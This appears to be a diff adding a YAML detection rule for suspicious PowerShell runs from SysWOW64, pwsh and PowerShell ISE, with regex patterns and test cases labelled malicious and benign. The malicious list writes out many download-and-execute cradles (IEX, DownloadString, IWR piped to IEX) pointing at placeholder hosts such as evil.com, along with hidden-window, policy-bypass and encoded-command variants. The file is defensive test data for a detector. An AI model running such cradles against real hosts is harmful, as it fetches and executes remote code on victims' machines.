@@ -1,0 +1,56 @@
+name: high-24-alt-powershell-paths
+severity: high
+description: >
+  Detects PowerShell execution from non-standard paths. Common evasion technique to bypass monitoring tools.
+
+patterns:
+  - name: syswow64-powershell-suspicious
+    pattern: (?i)SysWOW64.*powershell\.exe.*(IEX|DownloadString|DownloadFile|-enc|-e\s+[A-Za-z0-9+/]{20,}|-w\s+h|Invoke-WebRequest.*http|curl.*http|wget.*http)
+    description: Detects SysWOW64 PowerShell with suspicious indicators
+
+  - name: syswow64-powershell-simple
+    pattern: (?i)SysWOW64.*powershell\.exe.*(IWR|Invoke-WebRequest|curl|wget)\s+http
+    description: Detects SysWOW64 PowerShell with web request commands
+
+  - name: pwsh-suspicious
+    pattern: (?i)pwsh(\.exe)?.*(IEX|DownloadString|DownloadFile|-enc|-e\s+[A-Za-z0-9+/]{20,}|Invoke-WebRequest.*http|curl.*http|New-Object.*WebClient)
+    description: Detects pwsh with download or execution indicators
+
+  - name: powershell-ise-suspicious
+    pattern: (?i)powershell_ise(\.exe)?.*(IEX|DownloadString|-enc|-e\s+[A-Za-z0-9+/]{20,})
+    description: Detects PowerShell ISE with suspicious indicators
+
+malicious:
+  - "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -enc QwBhAGwAYwA="
+  - 'pwsh.exe -c "IWR http://evil.com/p.ps1 | IEX"'
+  - 'powershell_ise.exe -Command "IEX(New-Object Net.WebClient).DownloadString(''http://evil.com/p.ps1'')"'
+  - "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe IWR http://malware.com/script.ps1"
+  - "pwsh -encodedcommand SGFja2Vk"
+  - "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c \"malicious\""
+  - 'powershell_ise.exe -ep bypass -c "(New-Object Net.WebClient).DownloadString(''http://evil.com/mal.ps1'')|IEX"'
+  - 'pwsh.exe -WindowStyle Hidden -Command "IWR http://attacker.com/payload.ps1|IEX"'
+  - "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -nop -ep bypass -c \"IEX(IWR http://evil.com/s.ps1)\""
+  - 'pwsh -w h -c "curl http://malware.com/implant.ps1|iex"'
+  - "powershell_ise.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+  - "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Invoke-WebRequest http://evil.com/ransomware.ps1|IEX\""
+  - 'pwsh.exe -ep unrestricted -c "(New-Object Net.WebClient).DownloadFile(''http://evil.com/mal.exe'',''mal.exe'')"'
+  - 'powershell_ise.exe -w hidden -nop -c "IEX(IWR http://malware.com/stage2.ps1 -UseBasicParsing)"'
+  - 'pwsh -nop -w h -ep bypass -c "curl http://evil.com/dropper.ps1|iex"'
+  - "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe (New-Object Net.WebClient).DownloadString('http://evil.com/loader.ps1')|IEX"
+
+benign:
+  - "pwsh.exe Get-Process"
+  - "powershell_ise.exe"
+  - "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -File C:\\Scripts\\script.ps1"
+  - "pwsh -Command Get-Date"
+  - "powershell_ise.exe -File C:\\Scripts\\test.ps1"
+  - 'pwsh.exe -Command "Get-Service | Where-Object Status -eq ''Running''"'
+  - "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe Get-EventLog -LogName Application"
+  - "pwsh -NoProfile Get-ChildItem"
+  - 'powershell_ise.exe -Command "Get-Process | Format-Table"'
+  - "pwsh.exe -File C:\\Admin\\maintenance.ps1"
+  - "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Test-Path C:\\Temp\""
+  - "pwsh Get-Module -ListAvailable"
+  - "powershell_ise.exe -NoLogo"
+  - 'pwsh.exe -Command "Write-Output ''Hello World''"'
+  - "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -File C:\\IT\\Scripts\\backup.ps1"
